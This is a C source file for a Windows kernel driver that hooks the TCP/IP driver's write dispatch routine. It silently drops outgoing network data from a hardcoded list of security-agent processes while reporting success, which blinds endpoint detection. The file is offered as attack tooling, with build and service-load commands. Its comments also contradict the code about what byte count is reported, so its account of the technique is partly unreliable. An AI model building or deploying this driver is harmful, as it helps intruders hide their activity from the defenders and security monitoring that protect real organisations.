/*
 * irp_hook.c
 * Kernel IRP Hook — intercept tcpip.sys IRP_MJ_WRITE dispatch
 *
 * The TCP/IP stack driver (tcpip.sys) exposes a standard WDM dispatch table.
 * By replacing MajorFunction[IRP_MJ_WRITE] in tcpip's driver object, we run
 * BEFORE WFP processes the write — EDR writes can be swallowed here without
 * any WFP event being generated.
 *
 * Attack position in the stack:
 *   Application write()
 *     → Afd.sys (Ancillary Function Driver)
 *       → IRP_MJ_WRITE → [OUR HOOK] → tcpip.sys internals → WFP → NDIS → NIC
 *
 * This driver:
 *   1. Locates tcpip.sys DRIVER_OBJECT via ObReferenceObjectByName
 *   2. Saves original MajorFunction[IRP_MJ_WRITE] pointer
 *   3. Installs MyWriteHook
 *   4. Hook checks EPROCESS image name; if EDR: completes IRP with SUCCESS but
 *      advances buffer length to 0 (data is discarded)
 *   5. Non-EDR processes: call original handler
 *
 * PatchGuard note:
 *   DRIVER_OBJECT dispatch tables are NOT directly protected by PatchGuard on
 *   x64 Windows. However, tcpip.sys may have self-integrity checks. Testing in
 *   a VM with kernel debugging is strongly advised.
 *
 * Build: WDK 10, x64, /O2
 *   msbuild irp_hook.vcxproj /p:Configuration=Release /p:Platform=x64
 *
 * Load (test-signing mode only):
 *   sc create IrpHook type= kernel binpath= <path>\irp_hook.sys
 *   sc start IrpHook
 */

#include <ntddk.h>
#include <wdm.h>

#pragma warning(disable: 4100)
#pragma warning(disable: 4214)

/*
 * ObReferenceObjectByName: exported from ntoskrnl.exe but NOT declared in
 * public ntddk.h. Declare here at file scope so the WDK linker can resolve it.
 * Add ntoskrnl.lib to the linker inputs (it's already implied by WDK driver builds).
 */
NTSTATUS ObReferenceObjectByName(
    PUNICODE_STRING  ObjectName,
    ULONG            Attributes,
    PACCESS_STATE    PassedAccessState,
    ACCESS_MASK      DesiredAccess,
    POBJECT_TYPE     ObjectType,
    KPROCESSOR_MODE  AccessMode,
    PVOID            ParseContext,
    PVOID           *Object
);

/* IoDriverObjectType: exported POBJECT_TYPE* from ntoskrnl.exe */
extern POBJECT_TYPE *IoDriverObjectType;

/* ---- Target EDR image names (short name, upper/lowercase both checked) ---- */

static const char *EDR_IMAGE_NAMES[] = {
    "MsSense.exe",
    "MsMpEng.exe",
    "SenseCncProxy.exe",
    "csagent.exe",
    "elastic-agent.exe",
    "SentinelAgent.exe",
    "xagt.exe",
    NULL
};

static PDRIVER_DISPATCH g_OriginalWrite = NULL;
static PDRIVER_OBJECT   g_TcpipDrvObj   = NULL;

/* ---- Helpers ---- */

/*
 * Get the short image name from an EPROCESS (returns pointer to internal buffer).
 * PsGetProcessImageFileName returns a char* to a 15-char buffer in EPROCESS.
 * Valid only while EPROCESS reference is held (always true here since we're
 * called within the process context).
 */
static BOOLEAN IsEdrProcess(PEPROCESS process)
{
    if (!process) return FALSE;

    const char *imageName = PsGetProcessImageFileName(process);
    if (!imageName) return FALSE;

    for (int i = 0; EDR_IMAGE_NAMES[i] != NULL; i++) {
        /* Case-insensitive compare (kernel doesn't have _stricmp, so manual) */
        const char *a = imageName;
        const char *b = EDR_IMAGE_NAMES[i];
        BOOLEAN match = TRUE;

        while (*a && *b) {
            char ca = (*a >= 'A' && *a <= 'Z') ? (*a + 32) : *a;
            char cb = (*b >= 'A' && *b <= 'Z') ? (*b + 32) : *b;
            if (ca != cb) { match = FALSE; break; }
            a++; b++;
        }
        if (match && *a == '\0' && *b == '\0') return TRUE;
    }
    return FALSE;
}

/* ---- Hooked IRP_MJ_WRITE handler ---- */

static NTSTATUS HookedWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    /* Get the process that originated this IRP */
    PEPROCESS requestor = IoGetRequestorProcess(Irp);

    if (requestor && IsEdrProcess(requestor)) {
        /* Silently "succeed" the write — return STATUS_SUCCESS but send nothing.
         * The EDR's send() call returns success with BytesSent = 0,
         * which looks like a transient flow-control event, not an error. */
        PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
        ULONG writeLen = stack->Parameters.Write.Length;

        Irp->IoStatus.Status      = STATUS_SUCCESS;
        Irp->IoStatus.Information = writeLen; /* lie: report "all bytes written" */
        IoCompleteRequest(Irp, IO_NO_INCREMENT);

        DbgPrint("[IRP_HOOK] Swallowed write from EDR: %s (%lu bytes)\n",
                 PsGetProcessImageFileName(requestor), writeLen);

        return STATUS_SUCCESS;
    }

    /* Not an EDR — pass through to original tcpip.sys handler */
    return g_OriginalWrite(DeviceObject, Irp);
}

/* ---- Locate tcpip.sys driver object ---- */

static NTSTATUS GetTcpipDriverObject(PDRIVER_OBJECT *ppDrvObj)
{
    UNICODE_STRING driverName;
    RtlInitUnicodeString(&driverName, L"\\Driver\\Tcpip");

    return ObReferenceObjectByName(
        &driverName,
        OBJ_CASE_INSENSITIVE,
        NULL,
        0,
        *IoDriverObjectType,
        KernelMode,
        NULL,
        (PVOID *)ppDrvObj
    );
}

/* ---- Install / remove hook ---- */

static NTSTATUS InstallHook(void)
{
    NTSTATUS st = GetTcpipDriverObject(&g_TcpipDrvObj);
    if (!NT_SUCCESS(st)) {
        DbgPrint("[IRP_HOOK] Cannot get tcpip driver object: 0x%08X\n", st);
        return st;
    }

    /* Save and replace IRP_MJ_WRITE handler */
    g_OriginalWrite = g_TcpipDrvObj->MajorFunction[IRP_MJ_WRITE];
    InterlockedExchangePointer(
        (PVOID *)&g_TcpipDrvObj->MajorFunction[IRP_MJ_WRITE],
        HookedWrite
    );

    DbgPrint("[IRP_HOOK] Hook installed on tcpip.sys IRP_MJ_WRITE. Original: %p\n",
             g_OriginalWrite);
    return STATUS_SUCCESS;
}

static void RemoveHook(void)
{
    if (g_TcpipDrvObj && g_OriginalWrite) {
        InterlockedExchangePointer(
            (PVOID *)&g_TcpipDrvObj->MajorFunction[IRP_MJ_WRITE],
            g_OriginalWrite
        );
        g_OriginalWrite = NULL;
        DbgPrint("[IRP_HOOK] Hook removed. tcpip.sys IRP_MJ_WRITE restored.\n");
    }

    if (g_TcpipDrvObj) {
        ObDereferenceObject(g_TcpipDrvObj);
        g_TcpipDrvObj = NULL;
    }
}

/* ---- Driver unload ---- */

static VOID DriverUnload(PDRIVER_OBJECT driverObject)
{
    UNREFERENCED_PARAMETER(driverObject);
    RemoveHook();
    DbgPrint("[IRP_HOOK] Driver unloaded.\n");
}

/* ---- DriverEntry ---- */

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    DbgPrint("[IRP_HOOK] Loading...\n");

    DriverObject->DriverUnload = DriverUnload;

    NTSTATUS st = InstallHook();
    if (!NT_SUCCESS(st)) {
        DbgPrint("[IRP_HOOK] Failed to install hook: 0x%08X\n", st);
        return st;
    }

    DbgPrint("[IRP_HOOK] Active. EDR IRP_MJ_WRITE calls will be silently consumed.\n");
    return STATUS_SUCCESS;
}
